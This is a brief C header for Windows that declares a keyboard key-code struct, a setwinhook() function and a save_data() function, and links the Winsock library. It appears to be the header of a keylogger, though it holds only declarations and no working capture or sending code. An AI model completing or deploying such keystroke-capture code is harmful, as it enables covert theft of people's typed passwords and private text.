#pragma once

#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <io.h>


#pragma comment(lib, "ws2_32.lib")

struct keyboard
{
	DWORD code;
	char *character;
};

void	setwinhook();
void	save_data(const char*);